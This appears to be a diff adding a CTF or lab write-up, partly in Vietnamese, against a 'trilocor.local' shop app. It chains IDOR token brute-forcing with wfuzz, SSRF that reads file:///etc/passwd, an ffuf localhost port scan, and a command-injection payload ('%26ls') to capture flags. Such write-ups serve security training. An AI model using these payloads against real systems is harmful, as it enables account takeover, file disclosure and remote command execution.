@@ -1,0 +1,106 @@
+=>>> shoppp
+http://www.trilocor.local:9000/
+
+
+/// IDOR
+
+=> register new accout
+(anh 0)
+=> read source
+(anh 1)
+
+=> relize a endpoint and method to api (/api/tokens)
+(anh 2)
+
+=> post thu
+Content-Type: application/json
+
+{
+	"uid": "",
+	"username": ""
+}
+
+
+
+
+
+=> uid va username can phai trung nhau
+(anh3)
+
+=> FUZZ UID + USERNAME 
+
+seq 0 100 > uid.txt
+
+wfuzz -z file,uid.txt -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+  -X POST \
+  -d '{"uid":"FUZZ","username":"FUZ2"}' \
+  -H "Host: www.trilocor.local:9000" \
+  -H "Content-Type: application/json" \
+  -H "Cookie: PHPSESSID=71piioqd0ebtb4uhq45ant44cj" \
+  http://www.trilocor.local:9000/api/tokens
+  
+
+=>  UID = 1, USERNAME = administrator
+
+=> IDOR to get flag : 2a994426fb118a443a9bb31e781596a7 + token uuid admin ("token":"f19d77c3-753c-48d6-9430-4d1a09aea67d")
+
+
+
+
+
+//////////
+
+
+
+=> doc source phat hien endpoint /api/admin/healthcheck
+(hinh6)
+
+
+=> thu post
+
+{
+	"uuid": "f19d77c3-753c-48d6-9430-4d1a09aea67d",
+	"url": "file:///etc/passwd"
+}
+=> doc duoc (hinh 7)
+
+=> ta thu voi http => brute voi curl de tim cac endpoint cua may noi bo
+
+seq 0 10000 > ports.txt
+
+ffuf -w ports.txt  -u http://www.trilocor.local:9000/api/admin/healthcheck -X POST \
+     -H "Host: www.trilocor.local:9000" \
+     -H "Content-Type: application/json" \
+     -H "Cookie: PHPSESSID=71piioqd0ebtb4uhq45ant44cj" \
+     -d '{"uuid": "f19d77c3-753c-48d6-9430-4d1a09aea67d", "url": "http://127.0.0.1:FUZZ"}' -fs 36
+
+
+tim duoc 1 endpoint an
+(hinh8)
+=> truy cap vao endpoint
+
+=> hoi can tham so help (hinh 9)
+
+=> thu voi tham so help (hinh 10) loi
+
+
+=> chung ta dai khai doan duoc day la 1 lenh install => thu pha vo lenh bagn cach them parameter &install= &package= + %26ls command shell
+
+
+{
+	"uuid": "f19d77c3-753c-48d6-9430-4d1a09aea67d",
+	"url": "http://127.0.0.1:9090?install=&package=hahaha%26ls+/"
+}
+
+(anh11)
+
+=> ta thu doc flag 
+(anh12)
+=>ssrf + command logic inject
+
+
+
+
+=> THU duoc flag: 772c23010df9a580781c50be076c0029
+
+
